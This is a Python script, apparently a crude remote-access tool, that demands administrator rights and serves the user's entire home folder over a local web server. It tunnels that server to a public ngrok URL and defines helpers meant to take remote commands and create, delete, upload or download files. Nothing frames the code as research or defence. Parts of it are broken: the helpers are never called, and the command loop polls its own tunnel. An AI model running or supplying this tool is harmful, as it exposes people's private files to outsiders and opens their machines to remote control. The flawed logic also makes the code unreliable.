import os
import subprocess
import requests
import time
from pyuac import main_requires_admin

@main_requires_admin
def main():
    # Step 1: cd into user's folder in Windows
    os.chdir(os.path.expanduser("~"))
    print("CD'd into user's folder in Windows")

    # Step 2: Open up a local server using py -m http.server
    http_server_process = subprocess.Popen(["py", "-m", "http.server", "80"])
    time.sleep(2) # Give the server time to start up

    # Step 3: Use ngrok to expose that server publicly
    ngrok_process = subprocess.Popen(["C:/Users/cyn0v/Documents/GitHub/Black-Opal/Resources/ngrok.exe", "http", "80"])
    time.sleep(2) # Give ngrok time to start up

    ngrok_url = requests.get("http://localhost:4040/api/tunnels").json()["tunnels"][0]["public_url"]
    print(f"Public URL: {ngrok_url}")

    # Step 4: Create functions to wait for a command from another script through ngrok and make/delete/upload and download files
    def wait_for_command():
        """
        Wait for a command from another script through ngrok
        """
        while True:
            response = requests.get(f"{ngrok_url}/command")
            if response.status_code == 200:
                return response.text

    def make_file(file_name):
        """
        Create a file with the given file name
        """
        with open(file_name, "w") as f:
            f.write("")

    def delete_file(file_name):
        """
        Delete the file with the given file name
        """
        os.remove(file_name)

    def upload_file(local_file_path, remote_file_path):
        """
        Upload a local file to a remote file path
        """
        files = {"file": open(local_file_path, "rb")}
        response = requests.post(f"{ngrok_url}/upload/{remote_file_path}", files=files)
        if response.status_code != 200:
            print(f"Error uploading file: {response.text}")

    def download_file(remote_file_path, local_file_path):
        """
        Download a remote file to a local file path
        """
        response = requests.get(f"{ngrok_url}/download/{remote_file_path}")
        with open(local_file_path, "wb") as f:
            f.write(response.content)

if __name__ == "__main__":
    main()
